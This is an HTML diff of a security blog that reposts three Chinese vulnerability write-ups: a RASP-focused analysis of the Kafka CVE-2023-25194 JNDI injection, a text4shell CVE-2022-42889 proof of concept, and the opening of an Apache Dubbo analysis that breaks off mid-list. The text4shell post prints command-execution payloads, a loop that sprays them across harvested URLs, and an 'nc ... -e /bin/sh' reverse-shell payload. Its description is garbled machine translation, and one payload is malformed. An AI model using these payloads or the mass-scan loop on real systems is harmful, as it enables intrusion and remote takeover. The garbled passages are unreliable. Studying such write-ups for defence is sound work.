@@ -86,6 +86,589 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/23/CVE-2023-25194-Apache-Kafka/">
+                Apache Kafka 远程代码执行漏洞复现及攻击拦截 (CVE-2023-25194)
+            </a>
+        </h2>
+    
+    <time>
+        Jan 23, 2024
+    </time>
+    <section class="content">
+        <h1><span id="apache-kafka-远程代码执行漏洞复现及攻击拦截-cve-2023-25194">Apache Kafka 远程代码执行漏洞复现及攻击拦截 (CVE-2023-25194)</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2295788">云鲨RASP</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞简介">漏洞简介</span></h2><blockquote>
+<p>Apache Kafka是一个分布式数据流处理平台，可以实时发布、订阅、存储和处理数据流。Kafka Connect是一种用于在kafka和其他系统之间可扩展、可靠的流式传输数据的工具。攻击者可以利用基于SASLJAAS 配置和SASL 协议的任意Kafka客户端，对Kafka Connect worker 创建或修改连接器时，通过构造特殊的配置，进行JNDI 注入来实现远程代码执行。</p>
+</blockquote>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>2.4.0&lt;&#x3D;Apache kafka&lt;&#x3D;3.3.2</p>
+</blockquote>
+<h2><span id="修复方案">修复方案</span></h2><blockquote>
+<p>更新Apache Kafka至官方最新版本</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>通过<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub%E6%90%AD%E5%BB%BA">https://github.com/vulhub/vulhub搭建</a></p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>exp可参考：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml</a></p>
+<p>发起攻击请求：</p>
+<p>构造payload ,执行新建&#x2F;tmp&#x2F;test.txt文件</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/1.png" alt="image"></p>
+<p>验证漏洞存在，文件新建成功</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/2.png" alt="image"></p>
+<p>开启RASP后发起攻击：</p>
+<p>在业务优先模式下，RASP会出现JNDI注入的告警，拦截最终的命令执行</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/3.png" alt="image"></p>
+<p>堆栈信息为</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/4.png" alt="image"></p>
+<p>在防护模式下将直接在JNDI注入处被拦截</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/5.png" alt="image"></p>
+<p>堆栈信息为</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>开始</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Properties)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/7.png" alt="image"></p>
+<p>跟进到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Propertiesorg.apache.kafka.common.serialization.Serializer&lt;K&gt;,org.apache.kafka.common.serialization.Serializer&lt;V&gt;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/8.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.utils.Utils#propsToMap</span><br></pre></td></tr></table></figure>
+
+<p>对传入对象进行处理</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/9.png" alt="image"></p>
+<p>将map型的对象传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(java.util.Map&lt;java.lang.String,java.lang.Object&gt;org.apache.kafka.common.serialization.Serializer&lt;K&gt;org.apache.kafka.common.serialization.Serializer&lt;V&gt;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/10.png" alt="image"></p>
+<p>之后调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.ProducerConfig#appendSerializerToConfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/11.png" alt="image"></p>
+<p>将返回的newConfigs传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.ProducerConfig#ProducerConfig(java.util.Map&lt;java.lang.String,java.lang.Object&gt;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/12.png" alt="image"></p>
+<p>将配置参数传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#KafkaProducer(org.apache.kafka.clients.producer.ProducerConfig,org.apache.kafka.common.serialization.Serializer&lt;K&gt;org.apache.kafka.common.serialization.Serializer&lt;V&gt;org.apache.kafka.clients.producer.internals.ProducerMetadata,org.apache.kafka.clients.KafkaClientorg.apache.kafka.clients.producer.internals.ProducerInterceptors&lt;K,V&gt;org.apache.kafka.common.utils.Time)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/13.png" alt="image"></p>
+<p>赋值后调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.producer.KafkaProducer#newSender</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/14.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/15.png" alt="image"></p>
+<p>调用到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.clients.ClientUtils#createChannelBuilder</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/16.png" alt="image"></p>
+<p>赋值后调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.ChannelBuilders#clientChannelBuilder</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/17.png" alt="image"></p>
+<p>这里对值做了一个判断后调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.ChannelBuilders#create</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/18.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/19.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/20.png" alt="image"></p>
+<p>Create方法中得到map型的configs后进行switch，得到SaslChannelBuilder类型channelBuilder的对象，switch结束后调用了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.SaslChannelBuilder#configure</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/21.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/22.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.network.SaslChannelBuilder#configure</span><br></pre></td></tr></table></figure>
+
+<p>进入循环后到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.security.authenticator.LoginManager#acquireLoginManager</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/23.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/24.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/25.png" alt="image"></p>
+<p>判断值后到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.security.authenticator.LoginManager#LoginManager</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/26.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/27.png" alt="image"></p>
+<p>跟进到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.kafka.common.security.authenticator.AbstractLogin#login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/28.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.security.auth.login.LoginContext#login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/29.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.security.auth.login.LoginContext#invokePriv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/30.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.security.auth.login.LoginContext#invoke</span><br></pre></td></tr></table></figure>
+
+<p>进行逻辑判断后调用initialize方法</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/31.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/32.png" alt="image"></p>
+<p>Initialize中得到userProvider</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/33.png" alt="image"></p>
+<p>user.provider.url通过jndi提供</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/34.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.security.auth.<span class="keyword">module</span>.JndiLoginModule#login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/35.png" alt="image"></p>
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.security.auth.<span class="keyword">module</span>.JndiLoginModule#attemptAuthentication</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/36.png" alt="image"></p>
+<p>通过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.InitialContext#lookup(java.lang.String)</span><br></pre></td></tr></table></figure>
+
+<p>执行userProvider的值</p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/37.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-25194-Apache-Kafka/38.png" alt="image"></p>
+<p>由于RASP对javax.naming.InitialContext.lookup调用做了防护策略检测，所以会在此处拦截。</p>
+</blockquote>
+<h2><span id="reference">Reference</span></h2><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/luelueking/Java-CVE-Lists#cve-2023-25194">https://github.com/luelueking/Java-CVE-Lists#cve-2023-25194</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.snert.cn/index.php/2023/04/04/cve-2023-25194-kafka-jndi-injection-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://blog.snert.cn/index.php/2023/04/04/cve-2023-25194-kafka-jndi-injection-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/23/CVE-2022-42889-Apache-Commons/">
+                text4shell CVE-2022-42889 poc
+            </a>
+        </h2>
+    
+    <time>
+        Jan 23, 2024
+    </time>
+    <section class="content">
+        <h1><span id="text4shell-cve-2022-42889-poc">text4shell CVE-2022-42889 poc</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2022-42889/">雨苁</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>在 Apache Common Text 包 1.5 到 1.9 中发现了一个存在缺陷的代码执行版本。攻击者从 Apache Commons Text 中包含的过程中成功完成，插值可能被动态定义。服务器应用程序会受到影响(RCE) 和不受远程服务器的隐私接触的影响。</p>
+<p>Apache Commons Text 执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的 org.apache.commons.text.lookup.StringLookup 的实例。从 1.5 版到 1.9 版，默认 Lookup 实例集包括可能导致任意代码执行或与远程服务器联系的插值器。这些查找是： – “script” – 使用 JVM 脚本执行引擎 (javax.script) 执行表达式 – “dns” – 解析 dns 记录 – “url” – 从 url 加载值，包括来自远程服务器 如果使用了不受信任的配置值，则在受影响的版本中使用插值默认值的应用程序可能容易受到远程代码执行或与远程服务器的无意接触的影响。</p>
+<p>建议用户升级到 Apache Commons Text 1.10.0，默认情况下禁用有问题的插值器。</p>
+</blockquote>
+<h2><span id="影响范围">影响范围</span></h2><blockquote>
+<ul>
+<li>如果您依赖于使用 1.10.0 之前的 commons-text 版本的软件，您可能仍然不会受到攻击：只有当该软件使用<code>StringSubstitutor</code>API 而没有正确清理任何不受信任的输入时，您才会受到影响。</li>
+<li>如果您自己的软件使用 commons-text，请仔细检查它是否使用<code>StringSubstitutor</code>API，而没有正确清理任何不受信任的输入。如果是这样，更新到 1.10.0 可能是一个快速的解决方法，但推荐的解决方案是同时正确验证和清理任何不受信任的输入。</li>
+</ul>
+<p>Apache Commons Text 是一个低级库，用于执行各种文本操作，例如转义、计算字符串差异以及用通过插值器查找的值替换文本中的占位符。使用字符串替换功能时，一些可用的插值器可以触发网络访问或代码执行。这是有意的，但这也意味着如果应用程序在传递给替换的字符串中包含用户输入而未对其进行适当清理，则攻击者将允许攻击者触发这些插值器。</p>
+<p>出于这个原因，Apache Commons Text 团队决定将配置更新为“默认情况下更安全”，从而减轻无法验证输入的影响，并且不会让攻击者访问这些插值器。但是，仍然建议用户谨慎对待不受信任的输入。</p>
+<p>我们目前不知道有任何应用程序将不受信任的输入传递给替代者，因此在 Apache Commons Text 1.10.0 之前可能会受到此问题的影响。</p>
+<p>此问题与<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/security.html">Log4Shell (CVE-2021-44228)</a>不同，因为在 Log4Shell 中，可以从日志消息正文中进行字符串插值，该正文通常包含不受信任的输入。在 Apache Common Text issue 中，相关方法明确用于执行字符串插值并明确记录在案，因此应用程序不太可能在没有适当验证的情况下无意中传递不受信任的输入。</p>
+</blockquote>
+<h2><span id="漏洞利用条件">漏洞利用条件</span></h2><blockquote>
+<p>为了利用这些漏洞，<strong>必须满足以下要求</strong>：</p>
+<ul>
+<li>运行 1.5 到 1.9 版本的 Apache Commons Text</li>
+<li>使用<a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html">StringSubstitutor</a>插值器</li>
+</ul>
+</blockquote>
+<h2><span id="cve-2022-42889-poc">CVE-2022-42889 poc</span></h2><blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.get.Runtime().exec(\<span class="string">&#x27;&#x27;</span>.trim($cmd).<span class="string">&#x27;\&#x27;)&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>用有效负载替换参数值：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="网址">网址</span></h3><blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;url:UTF-<span class="number">8</span>:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Burl%3AUTF-8%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="dns">Dns</span></h3><blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;dns:address:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Bdns%3Aaddress%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="批量">批量</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/kljunowsky/97479082f50cd9219e80258f698c4d26/raw/7e600767bc59483653a34f17bd426340f28bf086/text4shell-payloads.txt">有效载荷.txt</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;url:UTF-<span class="number">8</span>:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;dns:address:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload in $(cat payloads.txt|sed <span class="string">&#x27;s/ COLLABORATOR-HERE/SPACEid.burpcollaborator.com/g&#x27;</span>); <span class="keyword">do</span> echo TARGET.com | gau --blacklist ttf,woff,svg,png | qsreplace <span class="string">&quot;$payload&quot;</span> | sed <span class="string">&#x27;s/SPACE/%20/g&#x27;</span> | grep <span class="string">&quot;java.lang.Runtime.getRuntime&quot;</span> &gt;&gt; payloads-<span class="keyword">final</span>.txt;done &amp;&amp; ffuf -w payloads-<span class="keyword">final</span>.txt -u FUZZ</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="如何利用-cve-2022-42889">如何利用 CVE-2022-42889</span></h2><blockquote>
+<p>为了重现攻击，易受攻击的组件部署在 Docker 容器中，可从 EC2 实例访问，该实例将由攻击者控制。使用 netcat (nc) 命令，我们可以打开与易受攻击的应用程序的反向 shell 连接。</p>
+<p>易受攻击的 Web 应用程序公开了一个搜索 API，其中查询通过Commons Text 的<em>StringSubstitutor进行插值：</em></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.app/text4shell/attack?search=&lt;query&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以下有效载荷可用于利用该漏洞并打开反弹 shell：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nc 192.168.49.1 9090 -e /bin/sh&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此有效负载由“${prefix:name}”组成，它触发字符串查找。如上所述，“script”、“dns”和“url”是可以作为前缀来利用漏洞的键。</p>
+<p>在发送精心制作的请求之前，我们需要使用 netcat (nc) 命令设置反向 shell 连接以侦听端口 9090</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 9090</span><br></pre></td></tr></table></figure>
+
+<p>我们现在可以发送精心制作的请求，URL 对有效负载进行编码，如下所示。</p>
+<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/1.png" alt="image"></p>
+<p>我们可以看到攻击者成功打开了与易受攻击的应用程序的连接。</p>
+<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/2.png" alt="image"></p>
+<p>现在攻击者可以以 root 身份与易受攻击的机器交互并执行任意代码。</p>
+</blockquote>
+<h2><span id="cve-2022-42889-的影响">CVE-2022-42889 的影响</span></h2><blockquote>
+<p>根据<a target="_blank" rel="noopener" href="https://sysdig.com/blog/vulnerability-score-cvss-meaning/">CVSSv3 系统，它的</a><strong>CRITICAL 严重性</strong>得分为 9.8 。</p>
+<p>由于易于利用以及在机密性、完整性和可用性方面的巨大潜在影响，严重性至关重要。正如我们在上一节中通过精心设计的请求展示的那样，您可以完全控制易受攻击的系统。</p>
+<p>但是，<strong>这些漏洞不太可能与之前的 log4shell 和 spring4shell 产生相同的影响。</strong></p>
+<p>查看易受攻击的组件，利用的可能性与 Apache Commons Text 库的使用有关。具体来说，<strong>只有当它使用一些用户控制的输入实现 StringSubstitutor 对象时，才有可能利用它。这种在生产环境中的实现不像 Log4j 中易受攻击的字符串替换那样普遍</strong>。因此，Text4Shell 的大规模影响并不能真正与 Log4Shell 相提并论。</p>
+</blockquote>
+<h2><span id="检测和缓解-cve-2022-42889">检测和缓解 CVE-2022-42889</span></h2><blockquote>
+<p>如果您受到<strong>CVE-2022-42889</strong>的影响，您应该将应用程序<strong>Apache Commons Text 更新到版本1.10。</strong></p>
+</blockquote>
+<h3><span id="burpsuite插件之text4shell漏扫扫描器">burpsuite插件之Text4Shell漏扫扫描器</span></h3><h4><span id="项目地址">项目地址:</span></h4><blockquote>
+<p>GitHub:<br><a target="_blank" rel="noopener" href="https://github.com/silentsignal/burp-text4shell">https://github.com/silentsignal/burp-text4shell</a></p>
+<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/3.png" alt="image"></p>
+</blockquote>
+<h4><span id="插件下载地址">插件下载地址:</span></h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/silentsignal/burp-text4shell/releases/download/v0.1/burp-text4shell.jar">burp-text4shell.jar</a></p>
+</blockquote>
+<h4><span id="单问题扫描">单问题扫描</span></h4><blockquote>
+<p>关于检测功能的注意事项：此插件只会为内置的主动扫描器提供有效负载，因此为了获得最佳覆盖率与性能，您必须正确配置扫描 – 就像任何其他内置或扩展提供的扫描一样.</p>
+<p>如果您只想扫描 CVE-2022-42889（而不是 XSS 或 SQLi 等其他东西），这个插件可以实现。</p>
+<p>按照以下说明，如果使用作为结果创建的扫描配置，扫描仪将仅对所有插入点执行 Text4Shell 检查。</p>
+<ol>
+<li>创建新扫描时，单击<code>Select from library</code>选项<code>Scan configuration</code>卡</li>
+<li>选择<code>Audit checks - extensions only</code>Burp Suite Pro 2.x 中内置的</li>
+<li>禁用所有其他已注册活动扫描检查的扩展程序（如果适用）（例如 ActiveScan++、反斜杠驱动扫描、Burp Bounty 等），以便仅运行 Text4Shell 扫描程序</li>
+</ol>
+</blockquote>
+<h4><span id="建造">建造</span></h4><blockquote>
+<p> 执行<code>./gradlew build</code>，您将准备好插件 <code>build/libs/burp-text4shell.jar</code></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/23/CVE-2023-29234-Apache-Dubbo/">
+                Apache dubbo 部分历史漏洞以及 CVE-2023-29234 分析
+            </a>
+        </h2>
+    
+    <time>
+        Jan 23, 2024
+    </time>
+    <section class="content">
+        <h1><span id="apache-dubbo-部分历史漏洞以及-cve-2023-29234-分析">Apache dubbo 部分历史漏洞以及 CVE-2023-29234 分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13187?time__1311=mqmxnDBDcD2A0=KDsD7mj5a=iNe0K3Irx&alichlgref=https://xz.aliyun.com/t/13187#toc-3">RacerZ</a> 并作补充</p>
+</blockquote>
+<h2><span id="写在前面">写在前面</span></h2><blockquote>
+<p>最近学习并梳理了一下 Apache dubbo 的两个经典由于泛化调用处理存在问题的 CVE 漏洞，并分析了一下最新 CVE-2023-29234 ，总结出了两种利用方式。</p>
+</blockquote>
+<h2><span id="cve-2021-30179">CVE-2021-30179</span></h2><h3><span id="前置泛化调用">前置：泛化调用</span></h3><blockquote>
+<p>泛化调用（客户端泛化调用）是指在调用方没有服务方提供的 API（SDK）的情况下，对服务方进行调用，并且可以正常拿到调用结果。详细见 <a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/</a></p>
+</blockquote>
+<h3><span id="调试分析">调试分析</span></h3><blockquote>
+<p><code>org.apache.dubbo.remoting.transport.DecodeHandler#received</code> 作为客户端 RPC 调用请求信息处理的入口点，调用 <code>decode</code> 方法。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/1.png" alt="image"></p>
+<p>根据参数类型可知实际会调用到 <code>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode()</code><br>其中会先调用 <code>CodecSupport.getSerialization</code> 方法，根据 id 选择相应的反序列化策略，默认会走 <code>org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization#deserialize</code> ，最终返回一个 <code>Hessian2ObjectInput</code> 实例。接着这一部分会按照顺序依次解析序列化流，获取 dubbo 服务版本、服务类路径、子版本、服务方法名以及参数描述符。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/2.png" alt="image"></p>
+<p>之后会根据方法名和参数名在服务端查找是否存在对应的服务方法，如果为 null，则调用 <code>RpcUtils.isGenericCall</code> 判断是否为泛型引用。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/3.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/4.png" alt="image"></p>
+<p>如果是的话则调用 <code>ReflectUtils.desc2classArray</code> 方法显式加载 desc 当中的类。之后根据类型执行 readObject 反序列化参数值，并设置到 <code>RpcInvocation</code> 实例的各个字段当中。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/5.png" alt="image"></p>
+<p>这个地方之前也是存在反序列化攻击利用的（感兴趣的师傅可以翻一翻以前的 CVE 分析）。不过根据</p>
+<p><a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/06/01/CVE-2021-30179">https://threedr3am.github.io/2021/06/01/CVE-2021-30179</a> - Dubbo Pre-auth RCE via Java deserialization in the Generic filter&#x2F;<br>提到：“受限于默认hessian或者已配置的序列化类型，具有一定的局限性”。</p>
+<p>整体梳理一下这部分序列化&#x2F;反序列化参数顺序：</p>
+<ul>
+<li>string * 5 (dubboVersion &#x2F; path &#x2F; version &#x2F; methodName &#x2F; desc)</li>
+<li>object * args (参数值实例，具体数量根据方法描述符 desc 决定)</li>
